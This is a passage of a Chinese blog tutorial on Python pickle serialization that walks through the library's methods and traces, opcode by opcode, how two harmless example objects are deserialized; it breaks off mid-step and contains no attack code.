{"title":"Python 反序列化浅析","uid":"7c4cd24912c14890fdfeed8e71bda8c9","slug":"Python 反序列化浅析","date":"2022-10-14T18:04:30.000Z","updated":"2023-03-14T07:32:04.000Z","comments":true,"path":"api/articles/Python 反序列化浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141531600.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于跳跳糖社区<a href=\"https://tttang.com/archive/1782/\">https://tttang.com/archive/1782/</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>之前所接触的大多是PHP 反序列化题型，最近遇见了一道Python pickle反序列化类型题，因此学习了一下其反序列化，简单总结如下，希望能对各位师傅有所帮助。</p>\n<h1 id=\"Pickle\"><a href=\"#Pickle\" class=\"headerlink\" title=\"Pickle\"></a>Pickle</h1><p>师傅们可自行先参考一下官方文档<br><a href=\"https://docs.python.org/zh-cn/3/library/pickle.html\">https://docs.python.org/zh-cn/3/library/pickle.html</a></p>\n<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p></blockquote>\n<p>通俗易懂的说，就是pickle实现了基本数据的序列化和反序列化。</p>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>Pickle包含四种方法，具体如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">pickle<span class=\"token operator\">.</span><span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> file<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//将obj对象进行封存，即序列化，然后写入到file文件中</span>\n<span class=\"token comment\">//注:这里的file需要以wb打开(二进制可写模式)</span>\npickle<span class=\"token operator\">.</span><span class=\"token function\">load</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//将file这个文件进行解封，即反序列化</span>\n<span class=\"token comment\">//注:这里的file需要以rb打开(二进制可读模式)</span>\npickle<span class=\"token operator\">.</span><span class=\"token function\">dumps</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//将obj对象进行封存，即序列化，然后将其作为bytes类型直接返回</span>\npickle<span class=\"token operator\">.</span><span class=\"token function\">loads</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//将data解封，即进行反序列化</span>\n<span class=\"token comment\">//注:data要求为bytes-like object(字节类对象)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>有关字节类对象，可以看官方这里的介绍<br><a href=\"https://docs.python.org/zh-cn/3/glossary.html#term-bytes-like-object\">https://docs.python.org/zh-cn/3/glossary.html#term-bytes-like-object</a><br>看到这里的话，其实也就明白了一点，常用的也就是<code>dump</code>和<code>load</code>，类似于PHP的<code>seralize</code>和<code>unseralize</code><br>这里简单举个例子</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\nzj <span class=\"token operator\">=</span> <span class=\"token string\">'tttang'</span>\n\nfilename <span class=\"token operator\">=</span> <span class=\"token string\">\"tttang\"</span>\n<span class=\"token comment\"># 序列化</span>\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span><span class=\"token comment\">#以二进制可写形式打开tttang这个文件</span>\n    pickle<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>zj<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span> <span class=\"token comment\">#将zj这个变量对应的字符串进行序列化并写入到f中</span>\n<span class=\"token comment\"># 读取序列化后生成的文件</span>\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 反序列化</span>\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span> <span class=\"token comment\">#以二进制可读形式打开tttang这个文件</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#将这个文件进行反序列化并输出</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行结果<br><img src=\"https://img-blog.csdnimg.cn/3d4f190f47ff4f16a4de0d647db4b833.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"demo源码分析\"><a href=\"#demo源码分析\" class=\"headerlink\" title=\"demo源码分析\"></a>demo源码分析</h3><p>想要理解反序列化，就得从最根本开始，因此这里从源码开始入手</p>\n<p>ctrl+鼠标左键查看<code>load</code>源码<br><img src=\"https://img-blog.csdnimg.cn/4e90fbea498542b6bdd5ec6b4ee131a6.png\" alt=\"在这里插入图片描述\"><br>找到<code>load</code>方法<br><img src=\"https://img-blog.csdnimg.cn/af751bd6a9cc4240bfc9af8ce288b12f.png\" alt=\"在这里插入图片描述\"><br>这里的大致含义就是将内容以二进制字节流形式读取并存放到file中，而后我们看到返回中利用了<code>load()</code>方法，继续跟进<br><img src=\"https://img-blog.csdnimg.cn/0cf51d24deee4daf8c444628ea0edcd6.png\" alt=\"在这里插入图片描述\"><br>这里主要看下面的这一点</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">:</span>\n        key <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> not key<span class=\"token punctuation\">:</span>\n            raise EOFError\n        assert <span class=\"token function\">isinstance</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> bytes_types<span class=\"token punctuation\">)</span>\n        dispatch<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span>\nexcept _Stop <span class=\"token keyword\">as</span> stopinst<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> stopinst<span class=\"token operator\">.</span>value<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里大致含义就是将字符串中的字符挨个进行读取，然后通过<code>dispatch</code>字典索引，调用对应方法<br>这里我们的字符串是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">b<span class=\"token string single-quoted-string\">'\\x80\\x04\\x95\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x06tttang\\x94.'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第一步<br>第一个也就是<code>\\x80</code>，查一下这个<code>\\x80</code><br><img src=\"https://img-blog.csdnimg.cn/29f1760f30db4308b55d304381c09656.png\" alt=\"在这里插入图片描述\"><br>发现对应的是<code>PROTO</code>，那么这里的话就是<code> dispatch[PROTO[0]]</code>，其对应的是<code>load_proto</code>方法，跟进</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">def <span class=\"token function\">load_proto</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">proto</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">self</span><span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">if</span> not <span class=\"token number\">0</span> <span class=\"token operator\">&lt;=</span> proto <span class=\"token operator\">&lt;=</span> <span class=\"token constant\">HIGHEST_PROTOCOL</span><span class=\"token punctuation\">:</span>\n        raise <span class=\"token function\">ValueError</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"unsupported pickle protocol: %d\"</span> <span class=\"token operator\">%</span> proto<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">self</span><span class=\"token operator\">.</span>proto <span class=\"token operator\">=</span> proto<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现这里是再读取一个字符串，然后这里的话是读取的<code>\\x04</code>,其含义大概是说这是一个根据四号协议反序列化的字符串</p>\n<p>第二步<br>此时读取的字符串是<code>\\x95</code>,搜索过后发现其对应</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">FRAME</span>            <span class=\"token operator\">=</span> b<span class=\"token string single-quoted-string\">'\\x95'</span>  <span class=\"token comment\"># indicate the beginning of a new frame</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>查这个<code>frame</code>对应函数，即<code>load_frame</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">def <span class=\"token function\">load_frame</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">frame_size</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">=</span> <span class=\"token function\">unpack</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;Q'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> frame_size <span class=\"token operator\">></span> sys<span class=\"token operator\">.</span>maxsize<span class=\"token punctuation\">:</span>\n        raise <span class=\"token function\">ValueError</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"frame size > sys.maxsize: %d\"</span> <span class=\"token operator\">%</span> frame_size<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">self</span><span class=\"token operator\">.</span>_unframer<span class=\"token operator\">.</span><span class=\"token function\">load_frame</span><span class=\"token punctuation\">(</span>frame_size<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里是又往后读取了八位代表frame的大小，这里的八位是<code>\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00</code>，表示其大小为<code>0</code>，后面的大致含义是将其进行二进制字节流转换然后赋值给<code>current_frame</code>。</p>\n<p>第三步<br>这里到了<code>\\x8c</code>，搜到对应的是<code>SHORT_BINUNICODE</code>，对应方法如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">def <span class=\"token function\">load_short_binunicode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">len</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">self</span><span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">self</span><span class=\"token operator\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'utf-8'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'surrogatepass'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里又往下读取了一位，然后调用了<code>append</code>方法，我们跟进一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">self</span><span class=\"token operator\">.</span>stack <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">self</span><span class=\"token operator\">.</span>append <span class=\"token operator\">=</span> <span class=\"token keyword\">self</span><span class=\"token operator\">.</span>stack<span class=\"token operator\">.</span>append<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>那么这里的话大致含义就是设置一个空数组，然后将读取的下一位存放进去（入栈），下一位是<code>\\x06tttang</code>，此时就把它存入栈中了</p>\n<p>第四步<br>此时继续往下读取字符串，对应的是<code>\\x94</code>，对应方法是<code>load_memoize</code>，跟进</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">def <span class=\"token function\">load_memoize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">memo</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">self</span><span class=\"token operator\">.</span>memo\n    memo<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>memo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">self</span><span class=\"token operator\">.</span>stack<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里的话大致含义就是memo是个空数组，然后它将栈中-1对应元素取出，存入数组中</p>\n<p>第五步<br>此时读取到最后一个字符串<code>.</code>，其对应的是stop，这里就结束了反序列化</p>\n<h3 id=\"示例及源码分析\"><a href=\"#示例及源码分析\" class=\"headerlink\" title=\"示例及源码分析\"></a>示例及源码分析</h3><p>上述只是一种简单的示例，抛砖引玉了属于是，而常见的序列化和反序列化，往往是出现在类和对象中，这里举出一个具体实例</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import pickle\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">tttang</span><span class=\"token punctuation\">:</span>\n    def <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword return-type\">self</span><span class=\"token operator\">.</span>name<span class=\"token operator\">=</span>name\n        <span class=\"token keyword\">self</span><span class=\"token operator\">.</span>age<span class=\"token operator\">=</span>age\na<span class=\"token operator\">=</span>pickle<span class=\"token operator\">.</span><span class=\"token function\">dumps</span><span class=\"token punctuation\">(</span><span class=\"token function\">tttang</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"19\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到结果如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">b<span class=\"token string single-quoted-string\">'\\x80\\x04\\x95:\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x06tttang\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x04name\\x94\\x8c\\x06quan9i\\x94\\x8c\\x03age\\x94\\x8c\\x0219\\x94ub.'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>由于刚刚已经说过了具体代码，所以这里不再放出自定义函数对应代码(师傅们自行查看源码更能增强理解)</p>\n<p>第一步<br>读取<code>\\x80</code>，其对应的是<code>PROTO</code>，这里调用<code>load_proto</code>方法，函数内容是读取下一个字符，读取到<code>\\x04</code>，这里的含义是表示这是一个根据四号协议序列化的字符串。</p>\n<p>第二步<br>读取<code>\\x95</code>，其对应的是<code>FRAME</code>，这里调用<code>load_frame</code>方法,函数内容是读取八个字符串,这里是<code>:\\x00\\x00\\x00\\x00\\x00\\x00\\x00</code>，然后将其值进行二进制字节流转换赋值给<code>current_frame</code></p>\n<p>第三步<br>读取<code>\\x8c</code>，其对应的是<code>SHORT_BINUNICODE</code>，对应方法是<code>load_short_binunicode</code>，函数内容是向下读取一位，然后压入栈中</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>__main__<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第四步<br>读取<code>\\x94</code>，其对应的是<code>MEMOIZE</code>，对应方法是<code>load_memoize</code>，函数内容是将栈中-1对应元素赋值给<code>memo[0]</code>,这里的话就是<code>memo[0]=\\x08__main</code>，而memo等于<code>&#123;&#125;</code>，那么这里就是<code>&#123;\\x08__main&#125;</code></p>\n<p>第五步<br>读取<code>\\x8c</code>,向下读取一位然后压入栈中，下一位是<code>\\x06tttang</code>，这里的话就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>__main__<span class=\"token punctuation\">,</span>tttang<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第六步<br>读取<code>\\x94</code>，将栈中-1对应元素存入<code>memo[1]</code>中，这里的话就是<code>memo[1]=tttang</code></p>\n<p>第七步<br>读取<code>\\x93</code>，对应函数是<code>load_stack_global</code>,函数内容是将栈中元素取出一个，作为对象名，这里就是<code>name=tttang</code>，接下来再取出一个，作为类名，这里就是<code>module=__main__</code>，然后压入栈中</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string single-quoted-string\">'__main__.tttang'</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第八步<br>读取<code>\\x94</code>，将栈中-1对应元素存入<code>memo[2]</code>中，这里的话就是将上面的字符串保存到<code>memo[2]</code>中</p>\n<p>第九步<br>读取<code>)</code>，对应的是<code>EMPTY_TUPLE</code>，也就是向栈中加入空元组</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string single-quoted-string\">'__main__.tttang'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>第十步<br>读取<code>\\x81</code>,对应函数是<code>load_newobj</code>,弹出<code>()</code>赋值给<code>args</code>，然后将<code>class &#39;__main__.tttang&#39;</code>赋值给<code>cls</code>，接下来<code>cls.__new__(cls,*args)</code>实例化对象，由于<code>args</code>为空，所以这里仍然是一个空的<code>tttang</code>对象</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string single-quoted-string\">'__main__.tttang'</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>第十步<br>读取<code>\\x94</code>，将上面实例化过后的对象存入<code>memo[3]</code></p>\n<p>第十一步<br>读取<code>&#125;</code>，往栈中压入空的字典</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string single-quoted-string\">'__main__.tttang'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第十二步<br>读取<code>\\x94</code>，将上述字符串存入<code>memo[4]</code></p>\n<p>第十三步<br>读取<code>(</code>，对应方法为<code>load_mark</code>,函数内容是将栈中元素压入到<code>metastack</code>中，然后将栈置空</p>\n<p>第十四步<br>读取<code>\\x8c</code>，向下读取一位压入栈中，下一位是<code>\\x04name</code>(\\x04代表name的长度)，这里就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第十五步<br>读取<code>\\x94</code>，这里的话栈中是<code>name</code>，因此就是<code>memo[5]=name</code></p>\n<p>第十六步<br>读取<code>\\x8c</code>，向下读取一位压入栈中，这里的话下一位是<code>\\x06quan9i</code>，因此就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">,</span>quan9i<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第十七步<br>读取<code>\\x94</code>，即<code>memo[6]=quan9i</code></p>\n<p>第十八步<br>读取<code>\\x8c</code>，读取下一位<code>\\x03age</code>，所以栈为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">,</span>quan9i<span class=\"token punctuation\">,</span>age<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第十九步<br>读取<code>x94</code>，这里的话是<code>memo[7]=age</code></p>\n<p>第二十步<br>读取<code>\\x8c</code>，读取下一位<code>\\x0219</code>，所以栈为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">,</span>quan9i<span class=\"token punctuation\">,</span>age<span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>第二十一步<br>读取<code>\\x94</code>，即<code>memo[8]=19</code></p>\n<p>第二十二步<br>读取<code>u</code>,对应函数为<code>load_setitems</code>,将栈赋值给<code>items</code>变量，然后将<code>metastack</code>中的弹出赋值给栈，所以这里的栈就变成了<code>&lt;class &#39;__main__.tttang&#39;&gt;,&#123;&#125;</code>，这里的话就是取出<code>__main__.tttang</code>作为字典，接下来进行range遍历</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">__main__<span class=\"token operator\">.</span>tttang<span class=\"token punctuation\">[</span>items<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>items<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n__main__<span class=\"token operator\">.</span>tttang<span class=\"token punctuation\">[</span>items<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>items<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>因此这里就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">__main__<span class=\"token operator\">.</span>tttang<span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>quan9i\n__main__<span class=\"token operator\">.</span>tttang<span class=\"token punctuation\">[</span>age<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">19</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>那么这里的话栈就变成</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">stack<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string single-quoted-string\">'__main__.tttang'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'age'</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'19'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>第二十三步<br>读取<code>b</code>，对应方法为<code>load_build</code>，弹出<code>&#123;&#39;name&#39;:&#39;quan9i&#39;,&#39;age&#39;:&#39;19&#39;&#125;</code>赋值给<code>state</code>，弹出<code>class 